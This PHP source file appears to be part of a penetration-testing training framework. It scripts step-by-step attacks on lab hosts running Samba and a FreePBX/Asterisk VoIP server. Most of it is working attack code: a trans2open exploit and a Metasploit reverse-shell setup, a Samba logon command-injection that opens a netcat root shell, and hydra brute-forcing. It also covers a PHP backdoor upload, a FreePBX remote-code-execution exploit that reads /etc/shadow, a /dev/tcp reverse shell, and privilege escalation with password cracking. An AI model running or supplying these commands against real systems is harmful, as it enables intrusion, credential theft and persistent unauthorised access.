<?php

class poc4service extends poc4net {
    
    
    public function __construct() {
        parent::__construct();
        
    }
    
  
    
    
    
    
    
    public function poc4smb(){
        $this->chapitre(__FUNCTION__);
        $ip = "10.60.10.134"; // kio1
        $prof = "10.60.10.1";
        $kio1_port_netbios = new PORT($ip,139, 'T');
        $kio1_port_netbios->port4pentest();$this->pause();
        
        $kio1_service_smb = new SERVICE($ip,139, 'T');
        $kio1_service_smb->service2netbios();$this->pause();
        
        $this->titre("Be root with exploit");
        //$kio1_service_smb->exploitdb($kio1_service_smb->service_version);$this->pause();
        //$kio1_service_smb->net("https://www.google.fr/search?hl=fr&q=$kio1_service_smb->service_version");$this->pause();
        //$this->net("https://www.exploit-db.com/exploits/10/");$this->pause();
        //$this->net("http://downloads.securityfocus.com/vulnerabilities/exploits/0x333hate.c");$this->pause();
        $this->requette("gcc -Wl $this->dir_tools/exploits/trans2root.c -o $this->dir_tmp/trans2root -w");
        $this->note("cat /var/mail/root");
        $this->requette("$this->dir_tmp/trans2root -t $ip");$this->pause();
        
        
        // set AutoRunScript multiconsolecommand -cl \"getsystem\",\"getuid\"
        // set AutoRunScript multi_console_command -rc $this->dir_tmp/$kio1_service_smb->ip.$kio1_service_smb->port.post_linux.rc
        // set AutoRunScript post/linux/gather/enum_system
        $query = "echo \"run post/linux/gather/enum_users_history\nrun post/linux/gather/enum_system\nrun post/linux/gather/enum_configs\nrun post/linux/gather/hashdump\nrun post/linux/manage/sshkey_persistence\" > $this->dir_tmp/$kio1_service_smb->ip.$kio1_service_smb->port.post_linux.rc";
        //$this->requette($query);
        $query = "echo \"db_status\nuse exploit/linux/samba/trans2open\nset RHOST $kio1_service_smb->ip\nset RPORT $kio1_service_smb->port\nset payload linux/x86/shell_reverse_tcp\nset LHOST $prof\nshow options\nexploit\nexit -y\n \" > $this->dir_tmp/".__FUNCTION__.".$kio1_service_smb->ip.$kio1_service_smb->port.rc";
        $this->requette($query);
        $query = "echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/".__FUNCTION__.".$kio1_service_smb->ip.$kio1_service_smb->port.rc "; // -y /opt/metasploit/apps/pro/ui/config/database.yml" ;
        $this->requette($query);$this->pause();
        
        
        
        $ip = "10.60.10.128"; // msf2
        $msf_service_smb = new SERVICE($ip,445, 'T');
        $msf_service_smb->service2smb();$this->pause();
        
        
        
        
        
        
        
        exit();
        
        // https://download.samba.org/pub/samba/stable/
        // vulnerable SMB into Kali
        
        
        // sudo msfcli auxiliary/scanner/smb/smb_lookupsid RHOSTS="msf2.hack.vlan" E
        /*
         * -- @usage
         -- nmap --script smb-psexec.nse --script-args=smbuser=<username>,smbpass=<password>[,config=<config>] -p445 <host>
         -- sudo nmap -sU -sS --script smb-psexec.nse --script-args=smbuser=<username>,smbpass=<password>[,config=<config>] -p U:137,T:139 <host>
         
         
         smb: \> help
         ?              allinfo        altname        archive        backup
         blocksize      cancel         case_sensitive cd             chmod
         logoff         ..             !
         smb: \> logon "/=`nc 10.60.10.1 9999 -e /bin/bash`"
         Password:
         session setup failed: NT_STATUS_IO_TIMEOUT
         smb: \>
         
         rohff@ldap:~$ nc -lknvp 9999
         listening on [any] 9999 ...
         connect to [10.60.10.1] from (UNKNOWN) [10.60.10.128] 54350
         id
         uid=0(root) gid=0(root)
         
         
         smb: \> showconnect
         //10.60.10.128/tmp
         smb: \> pwd
         Current directory is \\10.60.10.128\tmp\
         smb: \> ls
         .                                   D        0  Mon Feb 26 15:18:47 2018
         ..                                 DR        0  Sun May 20 20:36:12 2012
         .ICE-unix                          DH        0  Mon Feb 26 15:09:34 2018
         5710.jsvc_up                        R        0  Mon Feb 26 15:09:55 2018
         .X11-unix                          DH        0  Mon Feb 26 15:09:47 2018
         .X0-lock                           HR       11  Mon Feb 26 15:09:47 2018
         
         7282168 blocks of size 1024. 5418108 blocks available
         smb: \> get <file_name>
         smb: \> put <file_name>
         
         *
         * root@kali:~# acccheck.pl -T smb-ips.txt -v
         Host:192.168.1.201, Username:Administrator, Password:BLANK
         *
         * Name Disclosure Date Rank Description
         * ---- --------------- ---- -----------
         * auxiliary/admin/smb/check_dir_file normal SMB Scanner Check File/Directory Utility
         * auxiliary/admin/smb/delete_file normal SMB File Delete Utility
         * auxiliary/admin/smb/download_file normal SMB File Download Utility
         * auxiliary/admin/smb/list_directory normal SMB Directory Listing Utility
         * auxiliary/admin/smb/psexec_command normal Microsoft Windows Authenticated Administration Utility
         * auxiliary/admin/smb/psexec_ntdsgrab normal PsExec NTDS.dit And SYSTEM Hive Download Utility
         * auxiliary/admin/smb/samba_symlink_traversal normal Samba Symlink Directory Traversal
         * auxiliary/admin/smb/upload_file normal SMB File Upload Utility
         * auxiliary/fuzzers/smb/smb2_negotiate_corrupt normal SMB Negotiate SMB2 Dialect Corruption
         * auxiliary/fuzzers/smb/smb_create_pipe normal SMB Create Pipe Request Fuzzer
         * auxiliary/fuzzers/smb/smb_create_pipe_corrupt normal SMB Create Pipe Request Corruption
         * auxiliary/fuzzers/smb/smb_negotiate_corrupt normal SMB Negotiate Dialect Corruption
         * auxiliary/fuzzers/smb/smb_ntlm1_login_corrupt normal SMB NTLMv1 Login Request Corruption
         * auxiliary/fuzzers/smb/smb_tree_connect normal SMB Tree Connect Request Fuzzer
         * auxiliary/fuzzers/smb/smb_tree_connect_corrupt normal SMB Tree Connect Request Corruption
         * auxiliary/scanner/smb/ms08_067_check normal MS08-067 Scanner
         * auxiliary/scanner/smb/pipe_auditor normal SMB Session Pipe Auditor
         * auxiliary/scanner/smb/pipe_dcerpc_auditor normal SMB Session Pipe DCERPC Auditor
         * auxiliary/scanner/smb/psexec_loggedin_users normal Microsoft Windows Authenticated Logged In Users Enumeration
         * auxiliary/scanner/smb/smb2 normal SMB 2.0 Protocol Detection
         * auxiliary/scanner/smb/smb_enumshares normal SMB Share Enumeration
         * auxiliary/scanner/smb/smb_enumusers normal SMB User Enumeration (SAM EnumUsers)
         * auxiliary/scanner/smb/smb_enumusers_domain normal SMB Domain User Enumeration
         * auxiliary/scanner/smb/smb_login normal SMB Login Check Scanner
         * auxiliary/scanner/smb/smb_lookupsid normal SMB Local User Enumeration (LookupSid)
         * auxiliary/scanner/smb/smb_version normal SMB Version Detection
         * auxiliary/scanner/snmp/snmp_enumshares normal SNMP Windows SMB Share Enumeration
         * auxiliary/server/capture/smb normal Authentication Capture: SMB
         * auxiliary/server/http_ntlmrelay normal HTTP Client MS Credential Relayer
         * auxiliary/spoof/nbns/nbns_response normal NetBIOS Name Service Spoofer
         * exploit/linux/samba/chain_reply 2010-06-16 00:00:00 UTC good Samba chain_reply Memory Corruption (Linux x86)
         
         //$this->req_ret_str($query);$this->pause();$this->pause();
         
         pause ();
         
         
         * exploit/linux/samba/chain_reply 2010-06-16 00:00:00 UTC good Samba chain_reply Memory Corruption (Linux x86)
         * exploit/linux/samba/lsa_transnames_heap 2007-05-14 00:00:00 UTC good Samba lsa_io_trans_names Heap Overflow
         * exploit/linux/samba/setinfopolicy_heap 2012-04-10 00:00:00 UTC normal Samba SetInformationPolicy AuditEventsInfo Heap Overflow
         * exploit/linux/samba/trans2open 2003-04-07 00:00:00 UTC great Samba trans2open Overflow (Linux x86)
         * exploit/multi/samba/nttrans 2003-04-07 00:00:00 UTC average Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
         * exploit/multi/samba/usermap_script 2007-05-14 00:00:00 UTC excellent Samba "username map script" Command Execution
         *
         * sudo msfcli windows/smb/psexec smbpass=<hash smb>
         
         * 8 Establish a null session net use \\x.x.x.x\ipc$ “” /u:”"
         * 9 Enumerate local administrators local administrators \\x.x.x.x
         * 10 Enumerate Group Members global “group_name” \\x.x.x.x
         * 11 Enumerate NIC information getmac \\x.x.x.x
         * 12 Enumerate internal IP information epdump x.x.x.x
         
         */
        
    }
    
    public function poc4nfs(){
        $this->chapitre(__FUNCTION__);
        $this->msf = "10.60.10.132";
        $nfs = new SERVICE($this->msf, 2049, 'T');
        $nfs->service2nfs();
    }
    
    
    public function poc4vpn(){
        $this->chapitre(__FUNCTION__);
        $this->titre("Install VulnVPN");
        $this->vulnvpn = "10.99.99.1";
        
    }
    
    
    
    
    public function poc4voip(){ // OK
        $this->titre("Hacking VOIP");
        $this->voip = "10.60.10.150";
        $voip_ip = new IP($this->voip);
        $voip_ip->ip2port();
        $this->pause();
        
        
        $voip_port_sip = new PORT($this->voip,5060,'U');
        //$voip_vm = new VM($this->voip_vmx);
        $voip_port_sip->port4pentest();
        $version_resu = $voip_port_sip->port2version();
        list($service_name,$service_version) = $voip_port_sip->port4type($version_resu);
        $this->pause();
        // sip:username:password@host:port
        $voip_service = new SERVICE($voip_port_sip->ip, $voip_port_sip->port, $voip_port_sip->service_protocol);
        $voip_service->service2sip();
        $this->pause();
        
        
        $voip_port_web = new WEB($this->voip,80,'T',$this->voip);
        $voip_port_web->web2dico();$this->pause();
        $voip_port_web->web2enum();$this->pause();
        $this->net("$voip_port_web->http_type://$voip_port_web->vhost/panel/");
        $this->note("We confirm user's ID which we have found in SIP and now we get real User name");
        $this->pause();
        
        
        $this->note("We get two authentication");
        $this->net("$voip_port_web->http_type://$voip_port_web->vhost/admin/");
        $this->net("$voip_port_web->http_type://$voip_port_web->vhost/recordings/");
        $this->pause();
        
        
        $this->titre("1: Look into Recording Page");
        $this->requette("wget -qO- '$voip_port_web->http_type://$voip_port_web->vhost/recordings/' | grep -i \"password\" ");
        $this->note("Use your Voicemail Mailbox and Password
This is the same password used for the phone");
        $this->pause();
        $this->note("dico attack against auth with user 2000");
        $this->requette("hydra -l 2000 -P $this->dico_password -s $voip_port_web->port -w 30 -f $voip_port_web->vhost http-form-post \"/recordings/index.php:username=^USER^&password=^PASS^&btnSubmit=Submit:Incorrect Username or Password\" | grep -i  'login:' | grep 'password:' ");
        $this->pause();
        $this->titre("find admin acces with nessus -> admin/ari_password");
        $this->net("https://localhost:8834");
        $this->pause();
        $this->requette("hydra -l admin -p ari_password -s $voip_port_web->port -t 64 -w 30 -f $voip_port_web->vhost http-form-post \"/recordings/index.php:username=^USER^&password=^PASS^&btnSubmit=Submit:Incorrect Username or Password\" | grep -i  'login:' | grep 'password:'");
        $this->net("http://$voip_port_web->vhost/recordings/index.php");
        $this->pause();
        $this->net("http://$voip_port_web->vhost/recordings/index.php?m=featurecodes&f=display");
        $this->note("tape *97 to get Voicemail and *98 to Dial voicemail");
        $this->pause();
        $this->note("Now, We have login/pass -> 2000/0 for recording Auth - VoicemailBox ");
        $this->net("$voip_port_web->http_type://$voip_port_web->vhost/recordings/");
        $this->pause();
        $this->ssTitre("Download recording file");
        $this->net("$voip_port_web->http_type://$voip_port_web->vhost/recordings/misc/audio.php?recindex=7");
        $this->pause();
        $this->requette("vlc file:///home/rohff/Downloads/msg0000.wav");
        $this->pause();
        $this->note("Now, We have login/pass -> support/securesupport123 for recording Auth - VoicemailBox ");
        $this->net("$voip_port_web->http_type://$voip_port_web->vhost/admin/");
        $this->pause();
        
        
        $this->titre("2: Look into Admin Page");
        $this->titre("Haking 401 Basic authentication");
        $this->note("1: dico attack against auth with user ");
        $this->cmd("localhost","hydra -s $voip_port_web->port -l support -P $this->dico_password -w 30 -t 64 -f $voip_ip->ip http-get /admin/config.php | grep -i  'login:' | grep 'password:' ");
        $this->pause();
        $user_name = "admin";$user_pass = "ari_password";
        $this->auth2login_http4basic($user_name,$user_pass,"/admin/config.php");
        $this->pause();
        $user_name = "support";$user_pass = "securesupport123";
        $this->auth2login_http4basic($user_name,$user_pass,"/admin/config.php");
        $this->pause();
        
        $this->titre("2: Upload Backdoor");
        $this->pause();
        $this->net("$this->voip/admin/config.php?display=modules&type=tool&extdisplay=upload");
        $file_backdoor = $this->backdoor_com_php_simple_reverse($this->prof, 6666);
        $this->requette("tar -cvzf $file_backdoor.tgz $file_backdoor ");
        $this->net("$this->voip/modules");
        $this->pause();
        
        
        
        $this->titre("Attack Asterisk on Port 5038");
        $this->ssTitre("2: Method 1: check default login/password");
        $this->net("https://www.google.fr/search?hl=fr&q=FreePBX 2.5 default password Asterisk call manager 1.1");
        $this->net("https://www.voip-info.org/wiki/view/Asterisk+CLI");
        $this->net("https://asterisk-pbx.ru/wiki/asterisk/ami");
        $this->note("we find admin/amp111");
        $this->pause();
        $user_name = "admin";$user_pass = "amp111";
        $check = $this->auth2login_asterisk($user_name,$user_pass);
        $this->pause();
        if ($check==TRUE) {
            $this->ssTitre("Display All Users");
            $this->requette("echo 'action: login\r\nusername: $user_name\r\nsecret: $user_pass\r\n\r\naction: command\r\ncommand: sip show users\r\n' | nc $voip_asterisk->ip $voip_asterisk->port -v -w1 -n ");
            $this->requette("echo 'action: login\r\nusername: $user_name\r\nsecret: $user_pass\r\n\r\naction: GetConfig\r\nFilename: sip.conf\r\n' | nc $voip_asterisk->ip $voip_asterisk->port -v -w1 -n ");
            $this->note("locate voicemail users");
            $this->requette("echo 'action: login\r\nusername: $user_name\r\nsecret: $user_pass\r\n\r\naction: voicemailuserslist\r\n' | nc $voip_asterisk->ip $voip_asterisk->port -v -w1 -n  "); //  | grep -E -i \"(Voicemailbox|fullname)\"
            $this->requette("echo 'action: login\r\nusername: $user_name\r\nsecret: $user_pass\r\n\r\naction: voicemailuserslist\r\n' | nc $voip_asterisk->ip $voip_asterisk->port -v -w1 -n  | grep -E \"(VoiceMailbox|Fullname)\"");
            $this->ssTitre("ListCommands");
            $this->requette("echo 'action: login\r\nusername: $user_name\r\nsecret: $user_pass\r\n\r\naction: ListCommands\r\n\r\n' | nc $voip_asterisk->ip $voip_asterisk->port -v -w1 -n ");
        }
        $this->pause();
        
        $this->ssTitre("FreePBX Version");
        $this->requette("wget -qO- '$voip_port_web->http_type://$voip_port_web->vhost/recordings/' | grep -i \"freePBX\" ");
        $this->pause();
        $this->titre("Method 2: find vulnerabilite on FreePBX 2.5| Asterisk call manager version 1.1| Asterisk 1.6.2.11");
        // exploit-db search
        $this->net("https://www.google.fr/search?hl=fr&q=FreePBX 2.5 vulnerability");
        $this->net("https://www.google.fr/search?hl=fr&q=Asterisk call manager 1.1 vulnerability");
        $this->net("https://www.google.fr/search?hl=fr&q=Asterisk 1.6.2.11 vulnerability");
        $this->pause();
        
        
        $this->ssTitre("Test exploit N° 1");
        $query = "echo  \"db_status\nuse exploit/unix/http/freepbx_callmenum\nset RHOST $voip_ip->ip\nset EXTENSION 2000-2001\nexploit\n\" > $this->dir_tmp/voip_asterisk.rc";
        system($query);
        $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/voip_asterisk.rc -y /opt/metasploit/apps/pro/ui/config/database.yml");
        $this->pause();
        $this->ssTitre("Test exploit N° 2");
        $query = "echo  \"db_status\nuse exploit/unix/webapp/freepbx_config_exec\nset RHOST $voip_ip->ip\nexploit\n\" > $this->dir_tmp/voip_asterisk2.rc";
        system($query);
        $this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/voip_asterisk2.rc -y /opt/metasploit/apps/pro/ui/config/database.yml");
        $this->pause();
        $this->remarque("Failed all exploit from metasploit !!!!!!!!! Let's test other exploit");
        $this->pause();
        
        $this->ssTitre("RCE");
        $this->net("https://www.exploit-db.com/exploits/15098/");
        $this->requette("python $this->dir_php/exploits/sploit_asterisk.py $voip_port_web->http_type://$voip_port_web->vhost/admin admin ari_password ");
        $this->pause();
        
        
        $this->cmd("localhost","python $this->dir_php/exploits/sploit_asterisk.py $voip_port_web->http_type://$voip_port_web->vhost/admin support securesupport123 ");
        $this->pause();
        $this->net("http://$this->voip/admin/devloop-ivrrecording.php?cmd=ls");
        $this->pause();
        
        $this->net("http://$this->voip/admin/devloop-ivrrecording.php?cmd=cat /etc/amportal.conf");
        $this->pause();
        $encode_url = "cat /etc/amportal.conf | grep -E -i \"user|pass\" ";
        $this->cmd("URL ENCODE",$encode_url);
        $url_encode = $this->url_encode($encode_url);
        $this->cmd("URL ENCODED",$url_encode);
        $this->net("http://$this->voip/admin/devloop-ivrrecording.php?cmd=$url_encode");
        $this->pause();
        
        $voip_port_web->auth2login_mysql("freepbx", "fpbx");
        $this->pause();
        $this->note("when you make the call, (*97 can be used to obtain voicemail) it asks for a voicemail password");
        $this->net("http://$this->voip/admin/devloop-ivrrecording.php?cmd=cat /etc/asterisk/voicemail.conf");
        $this->pause();
        $this->net("http://$this->voip/admin/devloop-ivrrecording.php?cmd=cat /etc/passwd");
        $this->net("http://$this->voip/admin/devloop-ivrrecording.php?cmd=cat /etc/shadow");
        $this->pause();
        
        
        $encode_url = "nohup bash -i >& /dev/tcp/10.60.10.1/9999 0>&1";
        $this->cmd("URL ENCODE",$encode_url);
        $this->cmd("localhost","nc -lk -p 9999 -v -n");
        $this->pause();
        $url_encode = $this->url_encode($encode_url);
        $this->cmd("URL ENCODED",$url_encode);
        $this->net("http://$this->voip/admin/devloop-ivrrecording.php?cmd=$url_encode");
        $this->pause();
        
        // https://www.exploit-db.com/exploits/40296/
        // https://www.exploit-db.com/exploits/40614/
        // https://www.exploit-db.com/exploits/40312/
        // https://www.exploit-db.com/exploits/40345/
        // https://www.exploit-db.com/exploits/40232/
        // https://www.exploit-db.com/exploits/40434/
        // https://www.exploit-db.com/exploits/32512/ // RCE
        // https://www.exploit-db.com/exploits/2665/ // FI
        // https://www.exploit-db.com/exploits/18659/ // RCE
        // https://www.exploit-db.com/exploits/18650/ // RCE
        
        
        
        
        $this->titre("Privilege Escalation");
        
        $this->cmd("localhost","id");
        $this->cmd("localhost","cat /etc/shadow");
        $this->cmd("localhost","cat /etc/group");
        $this->cmd("localhost","netstat -tupan");
        $this->cmd("localhost","ps aux | grep root");
        $this->cmd("localhost","find / -perm -u=s -type f 2>/dev/null");
        $this->pause();
        $this->cmd("localhost","echo '$this->root_passwd' | sudo -S -l");
        $this->cmd("localhost","echo '$this->root_passwd' | sudo -S nmap --interactive");
        $this->cmd("localhost","!sh");
        $this->cmd("localhost","id");
        $this->cmd("localhost","cat /etc/shadow");
        $this->cmd("localhost","netstat -tupan");
        $this->pause();
        
        $this->ssTitre("Crack root Password");
        $this->cmd("localhost","./unshadow <passwd file> <shadow file> > combined.txt");
        $this->cmd("localhost","./john combined.txt");
        
        
        /*
         * titre("Metasploit");
         * gras("msf> keyscan_start -> keyscan_stop -> keyscan_dump");
         * // meterpreter > run screenspy -h
         * // screenspy -s windows -d 1 -t 60 => will take interactive Screenshot every 1 sec for 1 min long, windows local mode.
         *
         * * VoIP (Voice over IP)
         * There isn’t a whole lot covering VoIP within Metasploit. I challenge our readers to change this
         * because VoIP is integral to many businesses today. There are a few options, such as the
         * following Asterisk user dictionary-attack:
         * msf > use auxiliary/voip/asterisk_login
         * msf auxiliary(asterisk_login) > set RHOSTS 127.0.0.1
         * msf auxiliary(asterisk_login) > run
         * You may also change the username and password lists in the options. By default, it consumes
         * wordlists within Metasploit.
         *
         * Audio Capture
         * The Metasploit Framework has great ties with WarVOX, a project developed by HDM to wardial
         * phone numbers and record any audio that results from this. One module, in particular, is of
         * great use. The following module allows you to wardial a predefined set of phone numbers via an
         * IAX (probably Asterisk) server, and record the audio of the VoIP call:
         * msf > use auxiliary/scanner/voice/recorder
         * msf auxiliary(recorder) > set TARGETS 12223456,12224567,12225678,12226789
         * msf auxiliary(recorder) > set IAX_HOST 192.168.1.123
         * msf auxiliary(recorder) > set OUTPUT_PATH ~/recorded_calls
         * msf auxiliary(recorder) > run
         *
         *
         */
        
        
        
    }
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
}
?>
